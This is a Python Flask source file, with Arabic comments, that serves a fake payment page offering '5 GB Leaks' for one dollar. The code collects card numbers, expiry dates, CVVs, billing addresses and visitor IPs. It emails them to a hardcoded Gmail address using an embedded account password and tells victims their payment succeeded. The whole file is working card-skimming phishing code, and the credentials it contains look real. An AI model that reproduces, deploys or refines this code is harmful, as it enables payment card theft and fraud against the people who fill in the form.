from flask import Flask, request, render_template_string
import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

app = Flask(__name__)

# بيانات الإيميل (غيّرها ببياناتك)
EMAIL_ADDRESS = "ana.taroka@gmail.com"
EMAIL_PASSWORD = "duyj jicc wmic dlvo"
ADMIN_EMAIL = "ana.taroka@gmail.com"


# HTML بالإنجليزي + JavaScript لكشف نوع البطاقة
HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Payment</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
        .container { max-width: 600px; margin: auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }
        h1 { text-align: center; color: #333; }
        form { display: flex; flex-direction: column; gap: 15px; }
        label { font-weight: bold; }
        input, select { padding: 10px; border: 1px solid #ccc; border-radius: 5px; font-size: 16px; }
        button { background: #28a745; color: white; padding: 14px; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; margin-top: 30px; }
        button:hover { background: #218838; }
        .result { margin-top: 30px; padding: 20px; border-radius: 5px; text-align: center; font-size: 20px; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        .card-type { font-size: 18px; font-weight: bold; color: #007bff; min-height: 30px; }
        .fixed-amount { padding: 12px; background: #e9ecef; border: 1px solid #ced4da; border-radius: 5px; font-size: 18px; text-align: center; font-weight: bold; color: #495057; }
        .section { margin-top: 30px; padding-top: 20px; border-top: 1px solid #eee; }
        .section h2 { font-size: 20px; color: #333; margin-bottom: 15px; }
    </style>
    <script>
        function detectCardType(number) {
            const card = number.replace(/\s/g, '');
            let type = "Unknown";

            if (/^4/.test(card)) type = "Visa";
            else if (/^5[1-5]/.test(card)) type = "MasterCard";
            else if (/^3[47]/.test(card)) type = "American Express";
            else if (/^6/.test(card)) type = "Discover";
            else if (/^3[0|8|9]/.test(card)) type = "Diners Club";
            else if (/^2/.test(card)) type = "Mir (Russia)";

            document.getElementById('cardType').innerText = type;
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Pay 1$ Get 5 GB Leaks FREE!!!</h1>
        <form method="POST">
            <label>Card Number (16 digits):</label>
            <input type="text" name="card_number" maxlength="19" placeholder="e.g. 4111111111111111" oninput="detectCardType(this.value)" required>
            <div class="card-type" id="cardType">Unknown</div>

            <label>Expiry Date (MM/YY):</label>
            <input type="text" name="expiry" placeholder="e.g. 12/28" maxlength="5" required>

            <label>CVV (3 or 4 digits):</label>
            <input type="text" name="cvv" maxlength="4" placeholder="e.g. 123" required>

            <label>Amount:</label>
            <div class="fixed-amount">$1.00</div>
            <input type="hidden" name="amount" value="$1">

            <div class="section">
                <h2>Billing Address</h2>
                
                <label>Country:</label>
                <select name="country" required>
                    <option value="">Select Country</option>
                    <option value="US">United States</option>
                    <option value="CA">Canada</option>
                    <option value="GB">United Kingdom</option>
                    <option value="AU">Australia</option>
                    <option value="DE">Germany</option>
                    <option value="FR">France</option>
                    <option value="EG">Egypt</option>
                    <option value="SA">Saudi Arabia</option>
                    <option value="AE">United Arab Emirates</option>
                    <option value="Other">Other</option>
                </select>

                <label>Street Address:</label>
                <input type="text" name="street" placeholder="e.g. 123 Main St" required>

                <label>City:</label>
                <input type="text" name="city" placeholder="e.g. New York" required>

                <label>State / Province:</label>
                <input type="text" name="state" placeholder="e.g. NY" required>

                <label>ZIP / Postal Code:</label>
                <input type="text" name="zip" placeholder="e.g. 10001" required>
            </div>

            <button type="submit">Process Payment</button>
        </form>

        {% if message %}
        <div class="result {{ 'success' if success else 'error' }}">
            <strong>{{ message }}</strong>
        </div>
        {% endif %}
    </div>
</body>
</html>
'''

def send_email(card_data, ip):
    subject = "New Payment Attempt"
    body = f"""
New payment attempt at: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Card Number: {card_data['card_number']}
Card Type: {card_data['card_type']}
Expiry Date: {card_data['expiry']}
CVV: {card_data['cvv']}
Amount: {card_data['amount']}

Billing Address:
Country: {card_data['country']}
Street: {card_data['street']}
City: {card_data['city']}
State: {card_data['state']}
ZIP: {card_data['zip']}

IP Address: {ip}
"""
    msg = MIMEMultipart()
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = ADMIN_EMAIL
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.sendmail(EMAIL_ADDRESS, ADMIN_EMAIL, msg.as_string())
        server.quit()
    except Exception as e:
        print(f"Email failed: {e}")

@app.route('/', methods=['GET', 'POST'])
def home():
    message = ""
    success = False
    card_type = "Unknown"

    if request.method == 'POST':
        card_number = request.form.get('card_number', '').strip().replace(' ', '')
        expiry = request.form.get('expiry', '').strip()
        cvv = request.form.get('cvv', '').strip()
        amount = "$1"
        country = request.form.get('country', '')
        street = request.form.get('street', '')
        city = request.form.get('city', '')
        state = request.form.get('state', '')
        zip_code = request.form.get('zip', '')
        ip = request.remote_addr

        # كشف نوع البطاقة
        if card_number.startswith('4'):
            card_type = "Visa"
        elif card_number.startswith(('51', '52', '53', '54', '55')):
            card_type = "MasterCard"
        elif card_number.startswith(('34', '37')):
            card_type = "American Express"
        elif card_number.startswith('6'):
            card_type = "Discover"
        else:
            card_type = "Unknown"

        # التحقق
        is_valid = True
        if not (len(card_number) == 16 and card_number.isdigit()):
            is_valid = False
            message = "Invalid card number (must be 16 digits)"
        elif card_type == "Unknown":
            is_valid = False
            message = "Unsupported card type"
        elif not (len(cvv) in [3, 4] and cvv.isdigit()):
            is_valid = False
            message = "Invalid CVV"
        elif not validate_expiry(expiry):
            is_valid = False
            message = "Invalid or expired expiry date"
        elif not country or not street or not city or not state or not zip_code:
            is_valid = False
            message = "Please fill all billing address fields"

        if is_valid:
            success = True
            message = "Payment processed successfully! GET the leaks within 60 mins"
            
        # جمع البيانات للإيميل
        card_data = {
            'card_number': card_number,
            'card_type': card_type,
            'expiry': expiry,
            'cvv': cvv,
            'amount': amount,
            'country': country,
            'street': street,
            'city': city,
            'state': state,
            'zip': zip_code
        }

        # إرسال الإيميل
        send_email(card_data, ip)

    return render_template_string(HTML, message=message, success=success)

def validate_expiry(expiry):
    try:
        month, year = map(int, expiry.split('/'))
        if not (1 <= month <= 12):
            return False
        exp_date = datetime.datetime(2000 + year, month, 1)
        return exp_date > datetime.datetime.now()
    except:
        return False

if __name__ == '__main__':
    app.run()
